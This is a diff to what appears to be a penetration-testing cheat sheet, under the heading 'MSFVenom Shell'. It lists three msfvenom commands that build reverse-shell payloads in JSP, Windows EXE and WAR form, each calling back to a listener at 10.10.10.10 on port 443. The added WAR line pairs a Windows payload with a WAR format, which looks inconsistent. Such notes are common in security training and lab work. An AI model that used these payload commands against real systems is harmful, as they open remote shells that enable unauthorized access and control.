@@ -94,7 +94,8 @@ https://hashes.org/
 MSFVenom Shell:
 --------------------------------------------------
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp  
-msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe  
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > shell.war  
 
 Pivoting:
 --------------------------------------------------
